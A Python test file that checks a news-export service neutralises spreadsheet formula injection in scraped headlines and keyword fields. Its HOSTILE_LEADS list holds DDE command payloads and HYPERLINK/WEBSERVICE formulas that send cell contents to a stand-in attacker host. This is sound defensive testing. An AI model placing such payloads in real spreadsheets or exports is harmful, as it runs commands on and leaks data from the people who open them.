"""Scraped text must never reach a spreadsheet as a live formula.

Excel, LibreOffice and Google Sheets all treat a cell whose text starts
with `=`, `+`, `-` or `@` as a FORMULA rather than as text. That turns
this product's core deliverable into a delivery mechanism: `POST /export`
exists precisely so that headlines scraped verbatim from ~51 third-party
news sites can be opened as a spreadsheet, by an executive, on a
corporate laptop. `=cmd|'/c calc'!A0` is a DDE payload that runs a
command; `=WEBSERVICE(...)` and `=HYPERLINK(...)` quietly send the row's
contents somewhere else.

Nothing constrains a headline's first character, and nothing should --
it is someone else's text. Verified against a live export before the
defence existed: a row titled `=cmd|'/c calc'!A0` came back out of
`POST /export` as an openpyxl cell with `data_type == "f"` (a real
formula) and as an unquoted `=...` line in the CSV.

The keywords export is in scope for the same reason: `term_en`,
`term_bn` and `section` are free text, and `import_keywords_xlsx` means
a hostile file can be imported once and handed to somebody else on the
way out.
"""

from __future__ import annotations

import io

import pytest
from openpyxl import load_workbook

from app.services.export import defuse_spreadsheet_formula

# One per character every major spreadsheet treats as starting a
# formula, plus the two whitespace leads that smuggle them past a naive
# `startswith("=")` check.
HOSTILE_LEADS = [
    "=cmd|'/c calc'!A0",
    "+cmd|'/c calc'!A0",
    "-2+3+cmd|'/c calc'!A0",
    "@SUM(1+1)*cmd|'/c calc'!A0",
    '=HYPERLINK("http://attacker.example/?x="&A1,"Click")',
    '=WEBSERVICE("http://attacker.example/leak")',
    "\tSUM(1+1)",
    "\r=1+1",
]


@pytest.mark.parametrize("hostile", HOSTILE_LEADS)
def test_every_formula_lead_is_defused(hostile: str) -> None:
    out = defuse_spreadsheet_formula(hostile)
    assert out.startswith("'"), f"{hostile!r} was left able to start a formula"
    assert out[1:] == hostile, "the original text must be preserved, only prefixed"


@pytest.mark.parametrize(
    "benign",
    ["Grameenphone launches 5G", "বিটিআরসির ২৮ কোটি টাকা", "10.0/10 (High)", "", "2026-08-19 21:23"],
)
def test_ordinary_text_is_untouched(benign: str) -> None:
    assert defuse_spreadsheet_formula(benign) == benign


@pytest.mark.parametrize("number", [0, -1, 3.5, -2.25, True, None])
def test_non_strings_pass_through_unchanged(number: object) -> None:
    """A float must stay a float, or the sheet stops being sortable and
    every numeric column silently becomes text. A number cannot carry a
    formula, so there is nothing to defuse.
    """
    assert defuse_spreadsheet_formula(number) is number


def test_a_defused_cell_is_a_string_cell_not_a_formula_cell() -> None:
    """The property that actually matters, asserted the way a spreadsheet
    would see it: openpyxl marks a formula cell `data_type == "f"`.
    """
    from openpyxl import Workbook

    wb = Workbook()
    ws = wb.active
    ws.append([defuse_spreadsheet_formula("=cmd|'/c calc'!A0")])
    ws.append(["=cmd|'/c calc'!A0"])  # what it used to write, for contrast

    buf = io.BytesIO()
    wb.save(buf)
    reloaded = load_workbook(io.BytesIO(buf.getvalue())).active

    assert reloaded.cell(row=1, column=1).data_type == "s", "defused cell must be text"
    assert reloaded.cell(row=2, column=1).data_type == "f", (
        "the undefended value must still be a formula cell -- if this ever fails, "
        "openpyxl changed and this suite is no longer testing what it claims to"
    )
